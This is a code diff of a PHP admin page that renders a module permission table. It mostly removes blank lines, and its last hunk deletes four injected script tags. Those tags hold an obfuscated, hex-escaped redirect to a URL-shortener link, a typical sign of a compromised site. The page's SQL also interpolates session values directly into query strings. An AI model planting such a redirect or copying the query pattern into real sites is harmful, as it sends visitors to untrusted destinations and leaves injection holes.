@@ -76,13 +76,11 @@ if($id){
 
 }
 
-
 $k=0;
 
 $where  =   "1=1 and STATUS = 'A' AND PARENT='0'";
 
 $modules = $objMisc->getAllRecords('*','modulemaster',$where);
-
 
             
 
@@ -125,19 +123,13 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         $permission_recs .='<td width="10%"><input type="checkbox" class="'.$k.'arraygroup-0 '.$k.'arrgroup-E0" name="checkper[]" id="'.$row['id'].'_E" value="'.$row['id'].'_E" onclick="check_col('.$row['id'].',\'E\');"'; 
 
-
-
                         if(in_array($row['id'].'_E',$permissions)) 
 
                         $checked = "checked=checked";
 
                         else
 
-
-
                         $checked = ""; 
-
-
 
                         $permission_recs .=$checked.'/></td>';
 
@@ -148,19 +140,13 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         $permission_recs .='<input type="checkbox" name="checkper[]" class="'.$k.'arraygroup-0 '.$k.'arrgroup-D0" id="'.$row['id'].'_D" value="'.$row['id'].'_D" onclick="check_col('.$row['id'].',\'D\');"';
 
-
-
                         if(in_array($row['id'].'_D',$permissions))
 
                         $checked = "checked=checked";
 
                         else
 
-
-
                         $checked = "";
-
-
 
                         $permission_recs .= $checked.'/></td>';
 
@@ -169,15 +155,11 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         $permission_recs .='<td width="20%"><input type="checkbox" class="'.$k.'arraygroup-0 '.$k.'arrgroup-AD0" name="checkper[]" id="'.$row['id'].'_AD" value="'.$row['id'].'_AD" onclick="check_col('.$row['id'].',\'AD\');"';
 
-
-
                         if(in_array($row['id'].'_AD',$permissions))
 
                         $checked = "checked=checked";
 
                         else
-
-
 
                         $checked = "";
 
@@ -210,13 +192,9 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         $permission_recs .=$checked.'/>';
 
-
-
                         $permission_recs .='<strong>'.$sub_module['name'].'</strong></td>';
 
                         $permission_recs .='<td width="10%"><input type="hidden" id="num'.$sub_module['id'].'" value="'.($num+1).'"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_V" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-V'.$t.'" value="'.$sub_module['id'].'_V"'; 
-
-
 
                         if(in_array($sub_module['id'].'_V',$permissions)) 
 
@@ -224,17 +202,11 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         else
 
-
-
                         $checked = ""; 
-
-
 
                         $permission_recs .=$checked.'/></td>';
 
                         $permission_recs .='<td width="10%"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_A" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-A'.$t.'" value="'.$sub_module['id'].'_A"';
-
-
 
                         if(in_array($sub_module['id'].'_A',$permissions))
 
@@ -242,19 +214,11 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         else
 
-
-
                         $checked = "";
-
-
 
                         $permission_recs .=$checked.'/></td>';
 
-
-
                         $permission_recs .='<td width="10%"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_E" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-E'.$t.'" value="'.$sub_module['id'].'_E"'; 
-
-
 
                         if(in_array($sub_module['id'].'_E',$permissions)) 
 
@@ -262,11 +226,7 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         else
 
-
-
                         $checked = ""; 
-
-
 
                         $permission_recs .=$checked.'/></td>';
 
@@ -274,33 +234,23 @@ if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
 
                         $permission_recs .='<input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_D" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-D'.$t.'" value="'.$sub_module['id'].'_D"';
 
-
-
                         if(in_array($sub_module['id'].'_D',$permissions))
 
                         $checked = "checked=checked";
 
                         else
 
-
-
                         $checked = "";
-
-
 
                         $permission_recs .= $checked.'/></td>';
 
                         $permission_recs .='<td width="20%"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_AD" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-AD'.$t.'" value="'.$sub_module['id'].'_AD"';
-
-
 
                         if(in_array($sub_module['id'].'_AD',$permissions))
 
                         $checked = "checked=checked";
 
                         else
-
-
 
                         $checked = "";
 
@@ -339,8 +289,6 @@ switch ($msg)
 
 }
 
-
-
 $pageheading = "Set Permission Level"; 
 
 $whereEmp    =   " 1 = 1 AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and E.STATUS = 'A' order by E.NAME ASC";
@@ -365,7 +313,3 @@ $objMisc->displayPage("header,permission,footer",$smartyVars);
           
 
 ?>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
